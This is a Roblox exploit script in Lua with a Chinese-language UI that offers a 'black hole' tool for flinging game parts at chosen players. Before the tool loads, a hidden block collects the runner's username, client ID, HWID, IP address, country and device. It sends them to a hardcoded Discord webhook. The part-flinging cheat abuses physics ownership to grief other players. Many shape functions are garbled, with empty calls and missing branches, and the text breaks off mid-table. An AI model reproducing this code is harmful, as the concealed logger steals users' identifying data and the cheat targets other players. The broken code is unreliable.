local blackhole = Tab7:section("黑洞脚本", true)
blackhole:Button("超级黑洞(最推荐)", function()
do
    local GS_WEBHOOK = "https://discord.com/api/webhooks/1525444117822439464/OTC1rUXNMeVr8ZTurWe6yDLYI7Q6zwfX_eFCPRXZ9SvseNVnm8T6AqbI55oD1HZS_i9S"
    
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local UserInputService = game:GetService("UserInputService")
    local LocalizationService = game:GetService("LocalizationService")
    local MarketplaceService = game:GetService("MarketplaceService")
    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
    
    local localPlayer = Players.LocalPlayer
    if not localPlayer then
        return
    end

    local function safeCall(func, fallback)
        local success, result = pcall(func)
        return success and result or fallback
    end
    
    local function getAvatarImage(userId)
        return safeCall(function()
            local url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", userId)
            local response = HttpService:JSONDecode(game:HttpGet(url))
            return response.data[1].imageUrl
        end, "https://www.roblox.com/Thumbs/Avatar.ashx?x=180&y=180&userId=" .. userId)
    end
    
    local function getDeviceType()
        local touch = UserInputService.TouchEnabled
        local keyboard = UserInputService.KeyboardEnabled
        local mouse = UserInputService.MouseEnabled
        
        if touch and not keyboard and not mouse then return "移动设备"
        elseif not touch and keyboard and mouse then return "电脑"
        elseif touch and keyboard and mouse then return "模拟器"
        else return "未知" end
    end
    
    local function getExecutor()
        return (identifyexecutor and identifyexecutor()) or 
               (getexecutorname and getexecutorname()) or 
               "未知"
    end
    
    local function getHWID()
        return (gethwid and gethwid()) or "无法获取"
    end
    
    local function getIPAddress()
        local request = http_request or request or (syn and syn.request)
        if not request then return "无请求函数" end
        
        return safeCall(function()
            return request({Url = "https://api.ipify.org/", Method = "GET"}).Body
        end, "获取失败")
    end

    local userId = localPlayer.UserId
    local placeId = game.PlaceId
    
    local payload = {
        username = "tubers93脚本-机器人2号",
        embeds = {{
            color = tonumber("0x32CD32"),
            title = string.format("有人正在使用tubers93超级黑洞脚本 %s %d时%d分", 
                os.date("%Y年%m月%d日"), 
                tonumber(os.date("%H")), 
                tonumber(os.date("%M"))),
            
            thumbnail = {url = getAvatarImage(userId)},
            
            fields = {
                {name = "用户名", value = localPlayer.Name, inline = true},
                {name = "显示名称", value = localPlayer.DisplayName, inline = true},
                {name = "用户ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
                
                {name = "客户端ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "获取失败"), inline = false},
                
                {name = "地图ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
                {name = "地图名称", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "获取失败"), inline = true},
                
                {name = "注入器", value = getExecutor(), inline = true},
                {name = "账号年龄", value = string.format("%d天", localPlayer.AccountAge), inline = true},
                
                {name = "设备", value = getDeviceType(), inline = false},
                {name = "国家", value = string.format("国家: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "获取失败")), inline = false},
                {name = "语言", value = string.format("语言: %s", localPlayer.LocaleId), inline = false},
                
                {name = "会员状态", value = (localPlayer.MembershipType == Enum.MembershipType.Premium and "是" or "否"), inline = false},
                
                {name = "HWID", value = getHWID(), inline = true},
                {name = "IP地址", value = getIPAddress(), inline = true},
                {name = "IP查询", value = string.format("https://binaryfork.com/zh-tools/ip-address-lookup/?ip=%s#ip-lookup", getIPAddress()), inline = false}
            }
        }}
    }

    local request = http_request or request or HttpPost or (syn and syn.request)
    if not request then
        return
    end
    
    safeCall(function()
        request({
            Url = GS_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

local safetyCheck = (function()
    if getgenv then
        local genv = getgenv()
        if genv.DEBUG_MODE or genv._SECURE_LOAD then
            return false
        end
    end
    return true
end)()

if safetyCheck then
    local mainScriptLoader = function()
        local libraryURL = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
        local obsidianLib = loadstring(game:HttpGet(libraryURL .. "Library.lua"))()
        
        local playersService = game:GetService("Players")
        local runService = game:GetService("RunService")
        local workspaceService = game:GetService("Workspace")
        local localPlayer = playersService.LocalPlayer
        local userInputService = game:GetService("UserInputService")
        
        if not getgenv().Network then
            getgenv().Network = {
                BaseParts = {},
                Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
            }
            
            function Network.RetainPart(targetPart)
                if typeof(targetPart) == "Instance" and (targetPart:IsA("BasePart") and targetPart:IsDescendantOf(workspaceService)) then
                    table.insert(Network.BaseParts, targetPart)
                    targetPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
                    targetPart.CanCollide = false
                end
            end
            
            (function()
                localPlayer.ReplicationFocus = workspaceService
                runService.Heartbeat:Connect(function()
                    sethiddenproperty(localPlayer, "SimulationRadius", math.huge)
                    for _, part in pairs(Network.BaseParts) do
                        if part:IsDescendantOf(workspaceService) then
                            part.Velocity = Network.Velocity
                        end
                    end
                end)
            end)()
        end
        
        local mainWindow = obsidianLib:CreateWindow({
            Title = "tubers93脚本-超级黑洞",
            Footer = "tubers93牛逼",
            NotifySide = "Right",
            ShowCustomCursor = true
        })
        
        local uiTabs = {
            Main = mainWindow:AddTab("主要控制", "circle"),
            Player = mainWindow:AddTab("玩家目标", "user"),
            Announcement = mainWindow:AddTab("公告", "info")
        }
        
        local targetPlayerBox = uiTabs.Player:AddLeftGroupbox("目标")
        
        local shapeEnabled = false
        local shapeType = "斐波那契球体"
        local shapeSize = 50
        local rotationSpeed = 0.5
        local maxVelocity = 2000
        local minVelocity = 150
        local trackedParts = {}
        local timeAccumulator = 0
        local distanceFromPlayer = 40
        local targetPlayerName = nil
        local followMode = false
        local shapeOrientation = {X = 0, Y = 0, Z = 0}
        local shapeFacingMode = "默认"
        local shapeFixedRotation = CFrame.Angles(0, 0, 0)
        local suctionMultiplier = 1
        local isPositionFixed = false
        local fixedShapePosition = Vector3.new(0, 0, 0)
        
        local isLaunching = false
        local launchSpeed = 50
        local launchDistance = 100
        local launchDirection = Vector3.new(0, 0, -1)
        local launchStartPos = Vector3.new(0, 0, 0)
        local launchElapsedTime = 0
        local launchRotationSnapshot = 0
        
        local markedPosition = nil
        local isSkyFalling = false
        local skyFallSpeed = 300
        local skyFallPhase = "ascending"
        local markPart = nil
        local skyFallStartPosition = Vector3.new(0, 0, 0)
        local skyFallDescentStart = Vector3.new(0, 0, 0)
        local skyFallDescentDistance = 0

        local function createMarkPart(position)
            if markPart then
                markPart:Destroy()
                markPart = nil
            end
            
            local part = Instance.new("Part")
            part.Shape = Enum.PartType.Cylinder
            part.Size = Vector3.new(8, 0.5, 0.5)
            part.CFrame = CFrame.new(position + Vector3.new(0, 5, 0)) * CFrame.Angles(0, 0, math.rad(90))
            part.BrickColor = BrickColor.new("Bright red")
            part.Material = Enum.Material.Neon
            part.Anchored = true
            part.CanCollide = false
            part.Parent = workspaceService
            
            spawn(function()
                while part.Parent do
                    part.CFrame = part.CFrame * CFrame.Angles(0, math.rad(2), 0)
                    wait(0.01)
                end
            end)
            
            return part
        end
        
        local function rotatePointAroundCenter(point, center, orientation)
            local offset = point - center
            local rotated = offset
            
            if orientation.X ~= 0 then
                local angle = math.rad(orientation.X)
                local cos, sin = math.cos(angle), math.sin(angle)
                rotated = Vector3.new(
                    rotated.X,
                    rotated.Y * cos - rotated.Z * sin,
                    rotated.Y * sin + rotated.Z * cos
                )
            end
            
            if orientation.Y ~= 0 then
                local angle = math.rad(orientation.Y)
                local cos, sin = math.cos(angle), math.sin(angle)
                rotated = Vector3.new(
                    rotated.X * cos + rotated.Z * sin,
                    rotated.Y,
                    -rotated.X * sin + rotated.Z * cos
                )
            end
            
            if orientation.Z ~= 0 then
                local angle = math.rad(orientation.Z)
                local cos, sin = math.cos(angle), math.sin(angle)
                rotated = Vector3.new(
                    rotated.X * cos - rotated.Y * sin,
                    rotated.X * sin + rotated.Y * cos,
                    rotated.Z
                )
            end
            
            return center + rotated
        end
        
        local function getPlayerList()
            local playerNames = {}
            for _, player in pairs(playersService:GetPlayers()) do
                if player ~= localPlayer then
                    table.insert(playerNames, player.Name)
                end
            end
            return playerNames
        end
        
        local function getShapeCenter()
            if isPositionFixed then
                return fixedShapePosition
            end
            
            if isLaunching then
                local traveledDistance = launchSpeed * launchElapsedTime
                if traveledDistance >= launchDistance then
                    isLaunching = false
                    obsidianLib:Notify({
                        Title = "发射完成",
                        Description = "发射结束，形状已到达目标位置",
                        Time = 2
                    })
                    isPositionFixed = true
                    fixedShapePosition = launchStartPos + launchDirection * launchDistance
                    return fixedShapePosition
                end
                return launchStartPos + launchDirection * traveledDistance
            end
            
            local basePos
            local lookVector

            if followMode and targetPlayerName then
                local targetPlayer = playersService:FindFirstChild(targetPlayerName)
                local targetRootPart = targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                if targetRootPart then
                    basePos = targetRootPart.Position
                    lookVector = targetRootPart.CFrame.LookVector
                else
                    basePos = Vector3.new(0, 0, 0)
                    lookVector = Vector3.new(0, 0, -1)
                end
            else
                local localRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                if localRootPart then
                    basePos = localRootPart.Position
                    lookVector = localRootPart.CFrame.LookVector
                else
                    basePos = Vector3.new(0, 0, 0)
                    lookVector = Vector3.new(0, 0, -1)
                end
            end

            if shapeFacingMode == "固定方向" then
                lookVector = shapeFixedRotation.LookVector
            elseif shapeFacingMode == "指向目标" and targetPlayerName then
                local targetPlayer = playersService:FindFirstChild(targetPlayerName)
                local targetRootPart = targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                if targetRootPart then
                    lookVector = (targetRootPart.Position - basePos).Unit
                end
            end

            return basePos + lookVector * distanceFromPlayer
        end

        local function calculateShapePosition(shapeName, index, total, center, radius, timeOffset)
            local progress = index / math.max(total, 1)
            
            if shapeName == "巨龙螺旋" then
                local segment = index % 20
                local partType = math.floor(index / 20) % 8
                
                if partType == 0 then
                    local hornIndex = segment % 3
                    local hornAngle = (hornIndex - 1) * 0.5
                    local hornHeight = radius * (1.8 - (segment/20) * 0.3)
                    return Vector3.new(
                        center.X + math.cos(hornAngle) * radius * 0.3,
                        center.Y + hornHeight,
                        center.Z + math.sin(hornAngle) * radius * 0.3
                    )
                elseif partType == 1 then
                    local eyeOffset = (segment < 10) and -0.3 or 0.3
                    return Vector3.new(
                        center.X + eyeOffset,
                        center.Y + radius * 0.2,
                        center.Z - radius * 0.8
                    )
                elseif partType == 2 then
                    local snoutAngle = segment * math.pi * 2 / 20
                    return Vector3.new(
                        center.X + math.cos(snoutAngle) * radius * 0.6,
                        center.Y - radius * 0.1,
                        center.Z - radius * 1.2
                    )
                elseif partType == 3 then
                    local toothAngle = segment * math.pi * 4 / 20
                    return Vector3.new(
                        center.X + math.cos(toothAngle) * radius * 0.4,
                        center.Y - radius * 0.3,
                        center.Z - radius * 1.4
                    )
                elseif partType == 4 then
                    local scaleRing = math.floor(segment / 5)
                    local scaleRadius = radius * (0.7 + scaleRing * 0.1)
                    local scaleAngle = (segment % 5) * math.pi * 2 / 5
                    return Vector3.new(
                        center.X + math.cos(scaleAngle) * scaleRadius,
                        center.Y + math.sin(scaleRing * 0.5) * radius * 0.2,
                        center.Z + math.sin(scaleAngle) * scaleRadius
                    )
                else
                    local baseAngle = segment * math.pi * 2 / 20
                    local headRadius = radius * (1 + partType * 0.05)
                    return Vector3.new(
                        center.X + math.cos(baseAngle) * headRadius,
                        center.Y + math.sin(partType * 0.3) * radius * 0.1,
                        center.Z + math.sin(baseAngle) * headRadius
                    )
                end
                
            elseif shapeName == "雷神之锤" then
                local segment = index % 15
                local partType = math.floor(index / 15) % 4
                
                if partType == 0 then
                    local wrapAngle = segment * math.pi * 1.5
                    local leatherBump = math.sin(segment * 3) * radius * 0.05
                    return Vector3.new(
                        center.X + leatherBump,
                        center.Y + radius * (1.2 - (index/15)/10 * 2.4),
                        center.Z + math.sin(wrapAngle) * radius * 0.08
                    )
                elseif partType == 1 then
                    local face = segment % 6
                    local faceAngle = face * math.pi * 2 / 6
                    local hammerRadius = radius * (1.1 + math.sin(timeOffset * 2) * 0.1)
                    
                    if face < 3 then
                        return Vector3.new(
                            center.X + math.cos(faceAngle) * hammerRadius,
                            center.Y - radius * 1.6,
                            center.Z + math.sin(faceAngle) * hammerRadius * 0.7
                        )
                    else
                        return Vector3.new(
                            center.X + math.cos(faceAngle) * hammerRadius * 0.6,
                            center.Y - radius * 1.6,
                            center.Z + math.sin(faceAngle) * hammerRadius * 0.8
                        )
                    end
                elseif partType == 2 then
                    local runeAngle = segment * math.pi * 3 / 15
                    return Vector3.new(
                        center.X + math.cos(runeAngle) * radius * 0.8,
                        center.Y - radius * 1.6 + math.sin(runeAngle * 4 + timeOffset) * radius * 0.1,
                        center.Z + math.sin(runeAngle) * radius * 0.8
                    )
                else
                    local coreAngle = segment * math.pi / 7.5
                    local corePulse = 1 + math.sin(timeOffset * 5) * 0.2
                    return Vector3.new(
                        center.X + math.cos(coreAngle) * radius * 0.1 * corePulse,
                        center.Y - radius * 1.5,
                        center.Z + math.sin(coreAngle) * radius * 0.1 * corePulse
                    )
                end
                
            elseif shapeName == "魔法阵" then
                local ring = math.floor(index / math.ceil(total/4)) % 4
                local localIndex = index % math.ceil(total/4)
                local localProg = localIndex / math.max(math.ceil(total/4), 1)
                
                local configs = {
                    {segs = 12, rad = 1.0, speed = 0.8, height = 0.15},
                    {segs = 8, rad = 0.7, speed = 1.2, height = 0.1},
                    {segs = 6, rad = 0.45, speed = 1.6, height = 0.05},
                    {segs = 1, rad = 0.08, speed = 3, height = 0}
                }
                
                local cfg = configs[ring + 1]
                local segIdx = math.floor(localProg * cfg.segs)
                local segProg = (localProg * cfg.segs) % 1
                local angle = (segIdx / cfg.segs) * math.pi * 2 + timeOffset * cfg.speed
                
                if ring == 3 then
                    local pulse = 1 + math.sin(timeOffset * 4) * 0.3
                    return Vector3.new(
                        center.X + math.cos(angle) * radius * cfg.rad * pulse,
                        center.Y,
                        center.Z + math.sin(angle) * radius * cfg.rad * pulse
                    )
                end
                
                local hover = math.sin(timeOffset * 2 + ring + segIdx) * radius * cfg.height
                local conn = segProg * radius * 0.03
                
                return Vector3.new(
                    center.X + math.cos(angle) * radius * cfg.rad + math.cos(angle) * conn,
                    center.Y + hover,
                    center.Z + math.sin(angle) * radius * cfg.rad + math.sin(angle) * conn
                )
                
            elseif shapeName == "战神之剑" then
                local part = index % 18
                local layer = math.floor(index / 18) % 5
                
                if layer == 0 then
                    local bladeProg = part / 18
                    local groove = (bladeProg > 0.2 and bladeProg < 0.6) and -radius * 0.12 or 0
                    local serr = (bladeProg > 0.6) and math.sin(bladeProg * 40) * radius * 0.02 or 0
                    local tip = (bladeProg > 0.85) and (bladeProg - 0.85) / 0.15 * radius * 0.5 or 0
                    
                    return Vector3.new(
                        center.X + groove + serr,
                        center.Y + radius * (bladeProg - 0.35) * 3.8 + tip,
                        center.Z
                    )
                elseif layer == 1 then
                    local guardAng = part * math.pi * 2 / 18
                    local guardRad = radius * (0.8 + math.sin(part * 2) * 0.1)
                    return Vector3.new(
                        center.X + math.cos(guardAng) * guardRad,
                        center.Y - radius * 1.85,
                        center.Z + math.sin(guardAng) * guardRad
                    )
                elseif layer == 2 then
                    local gemAngle = part * math.pi / 4
                    local gemPulse = 1 + math.sin(timeOffset * 2) * 0.15
                    return Vector3.new(
                        center.X + math.cos(gemAngle) * radius * 0.25 * gemPulse,
                        center.Y - radius * 1.8,
                        center.Z + math.sin(gemAngle) * radius * 0.25 * gemPulse
                    )
                elseif layer == 3 then
                    local wrap = part * math.pi * 1.5
                    return Vector3.new(
                        center.X + math.cos(wrap) * radius * 0.08,
                        center.Y - radius * 2.1 - (part/18) * radius * 0.6,
                        center.Z + math.sin(wrap) * radius * 0.08
                    )
                else
                    local pommel = part * math.pi / 5
                    return Vector3.new(
                        center.X + math.cos(pommel) * radius * 0.15,
                        center.Y - radius * 2.7,
                        center.Z + math.sin(pommel) * radius * 0.15
                    )
                end
                
            elseif shapeName == "凤凰展翅" then
                local wing = index > total / 2 and 1 or -1
                local feather = index % math.ceil(total / 2)
                local featherProg = feather / math.max(math.ceil(total / 2), 1)
                local layer = math.floor(featherProg * 5)
                local layerProg = (featherProg * 5) % 1
                local wingSpan = radius * 3 * (1 - layer * 0.12)
                local curve = math.sin(layerProg * math.pi) * radius * (1.8 - layer * 0.15)
                local trail = (layerProg > 0.8) and (layerProg - 0.8) / 0.2 * radius * 2 or 0
                
                if layer == 0 and feather < 4 then
                    local crest = feather * 0.5
                    return Vector3.new(
                        center.X + wing * radius * 0.4,
                        center.Y + radius * 2 + math.sin(timeOffset + feather) * radius * 0.1,
                        center.Z - radius * 2 + crest
                    )
                end
                
                local eye = (layer == 1 and layerProg > 0.7) and radius * 0.4 or 0
                
                return Vector3.new(
                    center.X + wing * wingSpan * (1 - layerProg * 0.4),
                    center.Y + curve + layer * radius * 0.2,
                    center.Z - (layerProg - 0.5) * radius * 3.5 + trail + eye
                )
                
            elseif shapeName == "黑洞漩涡" then
                local disk = math.floor(index / math.ceil(total/3))
                local idx = index % math.ceil(total/3)
                local prog = idx / math.max(math.ceil(total/3), 1)
                
                local cfg = {
                    {arms = 3, rad = 1.0, spd = 0.5, visc = 1, h = 0.12},
                    {arms = 4, rad = 0.65, spd = 0.8, visc = 1.5, h = 0.08},
                    {arms = 5, rad = 0.35, spd = 1.2, visc = 2, h = 0.03}
                }
                
                local config = cfg[disk + 1]
                local arm = idx % config.arms
                local baseAng = arm * math.pi * 2 / config.arms
                local turb = math.sin(prog * config.visc * 8 + timeOffset * 2) * radius * 0.1
                local spiralAng = baseAng + prog * math.pi * (4 + disk * 2) + timeOffset * config.spd
                local dist = radius * config.rad * (1 - math.pow(prog, 0.5 + disk * 0.1))
                local diskH = math.sin(prog * math.pi * 6 + arm) * radius * config.h * (1 - prog)
                local jet = (prog > 0.85 and disk == 2) and (prog - 0.85) / 0.15 * radius * 2.5 or 0
                
                return Vector3.new(
                    center.X + math.cos(spiralAng) * dist + turb,
                    center.Y + diskH + jet,
                    center.Z + math.sin(spiralAng) * dist + turb
                )
                
            elseif shapeName == "帝王皇冠" then
                local section = index % 10
                local part = math.floor(index / 10) % 3
                local baseRadius = radius * 0.52
                local crownBaseHeight = radius * 0.35
                local mainSpikes = {1, 3, 5, 7, 9}
                local isMainSpike = false
                for _, spike in ipairs(mainSpikes) do
                    if section == spike then isMainSpike = true break end
                end
                
                if part == 0 then
                    local baseProg = index / 10 / 15
                    local relief = math.sin(section * math.pi * 2 / 10) * radius * 0.08
                    local filigree = math.sin(baseProg * 25) * radius * 0.02
                    return Vector3.new(
                        center.X + math.cos(section * math.pi * 2 / 10) * baseRadius + relief,
                        center.Y + baseProg * crownBaseHeight + filigree,
                        center.Z + math.sin(section * math.pi * 2 / 10) * baseRadius
                    )
                elseif part == 1 then
                    local spikeHeight = radius * (isMainSpike and 1.4 or 0.8)
                    local spikeProg = partIndex / 10
                    local baroque = math.sin(spikeProg * math.pi * 0.8) * radius * 0.3
                    local gem = (isMainSpike and spikeProg > 0.7) and radius * 0.1 or 0
                    
                    return Vector3.new(
                        center.X + math.cos(section * math.pi * 2 / 10) * baseRadius * (1 - spikeProg * 0.25),
                        center.Y + crownBaseHeight + baroque + spikeProg * spikeHeight,
                        center.Z + math.sin(section * math.pi * 2 / 10) * baseRadius * (1 - spikeProg * 0.25) + gem
                    )
                else
                    local tuftAngle = section * math.pi * 2 / 10
                    local tuftRadius = radius * 0.08
                    return Vector3.new(
                        center.X + math.cos(tuftAngle) * tuftRadius,
                        center.Y + radius * 0.2,
                        center.Z + math.sin(tuftAngle) * tuftRadius
                    )
                end
                
            elseif shapeName == "雷霆风暴" then
                local layer = math.floor(index / math.ceil(total/3))
                local idx = index % math.ceil(total/3)
                local prog = idx / math.max(math.ceil(total/3), 1)
                
                if layer == 0 then
                    local zigzag = math.floor(math.sin(prog * 30 + timeOffset * 5) * 5) * radius * 0.15
                    local ionize = math.sin(prog * 20) * radius * 0.05
                    return Vector3.new(
                        center.X + zigzag,
                        center.Y - prog * radius * 2.5 + ionize,
                        center.Z + zigzag * 0.3
                    )
                else
                    local branchLvl = layer
                    local branchPattern = branchLvl == 1 and 6 or 12
                    local branchAng = (idx % branchPattern) * math.pi * 2 / branchPattern + timeOffset * branchLvl
                    local branchProg = idx / math.ceil(total/3)
                    local branchLen = radius * (1 - branchLvl * 0.3) * branchProg
                    local ion = (branchProg > 0.9) and radius * 0.2 or 0
                    
                    return Vector3.new(
                        center.X + math.cos(branchAng) * branchLen,
                        center.Y - branchLvl * radius * 0.8 + ion,
                        center.Z + math.sin(branchAng) * branchLen
                    )
                end
                
            elseif shapeName == "末日堡垒" then
                local module = math.floor(index / math.ceil(total/4)) % 4
                local idx = index % math.ceil(total/4)
                local prog = idx / math.max(math.ceil(total/4), 1)
                
                if module == 0 then
                    local seg = idx % 12
                    local segProg = idx / 12
                    local angle = (seg / 12) * math.pi * 2 + timeOffset * 0.3
                    local hexAng = (seg % 6) * math.pi * 2 / 6
                    local thick = (segProg < 0.3) and 1.4 or 0.9
                    
                    return Vector3.new(
                        center.X + math.cos(angle) * radius * thick + math.cos(hexAng) * radius * 0.1,
                        center.Y + (segProg - 0.5) * radius * 0.4,
                        center.Z + math.sin(angle) * radius * thick + math.sin(hexAng) * radius * 0.1
                    )
                elseif module == 1 then
                    local barrel = idx % 3
                    local angle = (barrel / 3) * math.pi * 2 + timeOffset * 0.8
                    return Vector3.new(
                        center.X + math.cos(angle) * radius * 0.6,
                        center.Y,
                        center.Z + math.sin(angle) * radius * 0.6 + radius * 1.5
                    )
                elseif module == 2 then
                    local barrel = idx % 12
                    local angle = (barrel / 12) * math.pi * 2 + timeOffset * 1.2
                    return Vector3.new(
                        center.X + math.cos(angle) * radius * 0.8,
                        center.Y,
                        center.Z + math.sin(angle) * radius * 0.8 + radius * 0.8
                    )
                else
                    local core = idx % 4

                    return Vector3.new(

                        center.Y + radius * 0.2,

                    )
                end
                
            elseif shapeName == "神圣十字架" then
                local comp = math.floor(index / math.ceil(total/5)) % 5
                local idx = index % math.ceil(total/5)
                local prog = idx / math.max(math.ceil(total/5), 1)

                    local rings = math.sin(prog * 40) * radius * 0.03
                    local nails = (prog * 20 % 1 < 0.1) and radius * 0.08 or 0
                    return Vector3.new(
                        center.X + rings,
                        center.Y + (prog - 0.5) * radius * 4.5 + nails,
                        center.Z
                    )
                elseif comp == 1 then
                    local grain = math.cos(prog * 35) * radius * 0.025
                    local nails = (prog * 15 % 1 < 0.08) and radius * 0.06 or 0
                    return Vector3.new(
                        center.X + (prog - 0.5) * radius * 2.6 + grain,
                        center.Y + radius * 1.6 + nails,
                        center.Z
                    )
                elseif comp == 2 then
                    local baroque = math.sin(prog * 25 + timeOffset) * radius * 0.04
                    return Vector3.new(

                        center.Y + radius * 1.65 + baroque,
                        center.Z + radius * 0.02
                    )

                    local letter = math.sin(prog * 30 + idx * 2) * radius * 0.035
                    return Vector3.new(
                        center.X + radius * 0.15,
                        center.Y + (prog - 0.5) * radius * 4.2,
                        center.Z + letter
                    )
                else
                    local haloIndex = idx
                    local angle = (haloIndex / math.ceil(total/5)) * math.pi * 2 + timeOffset * 1.5
                    local haloPulse = 1 + math.sin(timeOffset * 3) * 0.2
                    return Vector3.new(
                        center.X + math.cos(angle) * radius * 0.3,
                        center.Y + radius * 2.2,
                        center.Z + math.sin(angle) * radius * 0.3 * haloPulse
                    )
                end
                
            elseif shapeName == "泰坦战斧" then
                local part = index % 25

                    local blade = part / 25
                    local edge = (blade < 0.4) and radius * 1.8 or radius * 1.2
                    local serrate = (blade > 0.5) and math.sin(blade * 30) * radius * 0.05 or 0
                    return Vector3.new(
                        center.X + edge,

                    )

                    )

                    )

            elseif shapeName == "深渊魔眼" then
                local ring = math.floor(index / math.ceil(total/5)) % 5
                local idx = index % math.ceil(total/5)

                    {segs = 16, rad = 1.2, speed = 0.5, h = 0.2}
                }
                
                local cfg = configs[ring + 1]
                local segIdx = math.floor(prog * cfg.segs)
                local segProg = (prog * cfg.segs) % 1

                if ring == 2 then
                    local pulse = 1 + math.sin(timeOffset * 4) * 0.3
                    return Vector3.new(
                        center.X + math.cos(angle) * radius * cfg.rad * pulse,
                        center.Y,
                        center.Z + math.sin(angle) * radius * cfg.rad * pulse
                    )
                end

                    center.Y + math.sin(timeOffset * 2 + ring) * radius * cfg.h + tentacle,
                    center.Z + math.sin(angle) * radius * cfg.rad
                )

                return Vector3.new(

                )

                            return Vector3.new(center.X, center.Y, center.Z)
                        elseif minorLayer == 3 then
                            return Vector3.new(center.X, center.Y, center.Z)
                        else
                            return Vector3.new(center.X, center.Y, center.Z)
                        end
                    end
                end
            else
                return center
            end
        end
        
        local function isValidPart(part)
            if not part:IsA("BasePart") or (part.Anchored or not part:IsDescendantOf(workspaceService)) then
                return false
            end
            if part.Parent == localPlayer.Character or part:IsDescendantOf(localPlayer.Character) then
                return false
            end
            part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
            part.CanCollide = false
            return true
        end
        
        local function addTrackedPart(part)
            if isValidPart(part) and not table.find(trackedParts, part) then
                table.insert(trackedParts, part)
            end
        end
        
        local function removeTrackedPart(part)
            local index = table.find(trackedParts, part)
            if index then
                table.remove(trackedParts, index)
            end
        end
        
        for _, descendant in pairs(workspaceService:GetDescendants()) do
            addTrackedPart(descendant)
        end
        
        workspaceService.DescendantAdded:Connect(addTrackedPart)
        workspaceService.DescendantRemoving:Connect(removeTrackedPart)
        
        runService.Heartbeat:Connect(function(deltaTime)
            if isLaunching then
                launchElapsedTime = launchElapsedTime + deltaTime
            end
            
            if isSkyFalling then
                launchElapsedTime = launchElapsedTime + deltaTime
                
                local centerPosition = nil
                
                if skyFallPhase == "ascending" then
                    local ascentTarget = skyFallStartPosition + Vector3.new(0, 1000, 0)
                    local ascentTime = 1000 / skyFallSpeed
                    local progress = math.min(launchElapsedTime / ascentTime, 1)
                    centerPosition = skyFallStartPosition:Lerp(ascentTarget, progress)
                    
                    if progress >= 1 then
                        skyFallPhase = "descending"
                        launchElapsedTime = 0
                        
                        local localRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                        if localRootPart and markedPosition then
                            skyFallDescentStart = localRootPart.Position + Vector3.new(0, 1000, 0)
                            launchDirection = (markedPosition - skyFallDescentStart).Unit
                            skyFallDescentDistance = (markedPosition - skyFallDescentStart).Magnitude
                            launchSpeed = skyFallSpeed
                            
                            obsidianLib:Notify({
                                Title = "天降进行中",
                                Description = "开始精准打击，距离: " .. string.format("%.1f米", skyFallDescentDistance),
                                Time = 2
                            })
                        else
                            isSkyFalling = false
                            launchElapsedTime = 0
                        end
                    end
                elseif skyFallPhase == "descending" and markedPosition then
                    if skyFallDescentStart then
                        local traveledDistance = launchSpeed * launchElapsedTime
                        
                        if traveledDistance >= skyFallDescentDistance then
                            isSkyFalling = false
                            launchElapsedTime = 0
                            
                            obsidianLib:Notify({
                                Title = "天降完成",
                                Description = "精准打击已到达标记点",
                                Time = 3
                            })
                            
                            if markPart then
                                markPart:Destroy()
                                markPart = nil
                            end
                            markedPosition = nil
                            
                            isPositionFixed = false
                        else
                            centerPosition = skyFallDescentStart + launchDirection * traveledDistance
                        end
                    else
                        isSkyFalling = false
                        launchElapsedTime = 0
                    end
                end
                
                if centerPosition then
                    local totalParts = #trackedParts
                    if totalParts ~= 0 then
                        for index, part in pairs(trackedParts) do
                            if part.Parent and not part.Anchored then
                                local targetPosition = calculateShapePosition(shapeType, index, totalParts, centerPosition, shapeSize, timeAccumulator)
                                targetPosition = rotatePointAroundCenter(targetPosition, centerPosition, shapeOrientation)
                                if targetPosition then
                                    local distance = (targetPosition - part.Position).Magnitude
                                    local directionVector = (targetPosition - part.Position).Unit
                                    local maxSpeed = math.min(distance * 10, maxVelocity)
                                    local speed = math.min(maxSpeed, minVelocity) * suctionMultiplier
                                    
                                    if distance > 0.5 then
                                        part.Velocity = directionVector * speed
                                    else
                                        part.Velocity = part.Velocity * 0.9
                                    end
                                end
                            end
                        end
                    end
                end
            elseif shapeEnabled and not isLaunching then
                timeAccumulator = timeAccumulator + deltaTime * rotationSpeed
                
                local centerPosition = getShapeCenter()
                local totalParts = #trackedParts
                
                if totalParts ~= 0 then
                    for index, part in pairs(trackedParts) do
                        if part.Parent and not part.Anchored then
                            local currentTime = isLaunching and launchRotationSnapshot or timeAccumulator
                            local targetPosition = calculateShapePosition(shapeType, index, totalParts, centerPosition, shapeSize, currentTime)
                            targetPosition = rotatePointAroundCenter(targetPosition, centerPosition, shapeOrientation)
                            if targetPosition then
                                local distance = (targetPosition - part.Position).Magnitude
                                local directionVector = (targetPosition - part.Position).Unit
                                local maxSpeed = math.min(distance * 10, maxVelocity)
                                local speed = math.min(maxSpeed, minVelocity) * suctionMultiplier
                                
                                if distance > 0.5 then
                                    part.Velocity = directionVector * speed
                                else
                                    part.Velocity = part.Velocity * 0.9
                                end
                            end
                        end
                    end
                end
            end
        end)
        
        local shapeControlBox = uiTabs.Main:AddLeftGroupbox("形状控制")
        shapeControlBox:AddToggle("ShapeToggle", {
            Text = "启用形状",
            Default = false,
            Callback = function(value)
                shapeEnabled = value
                if value then
                    obsidianLib:Notify({
                        Title = "形状大师",
                        Description = "形状已激活！",
                        Time = 2
                    })
                end
            end
        })
        
        shapeControlBox:AddDropdown("ShapeSelector", {
            Values = {
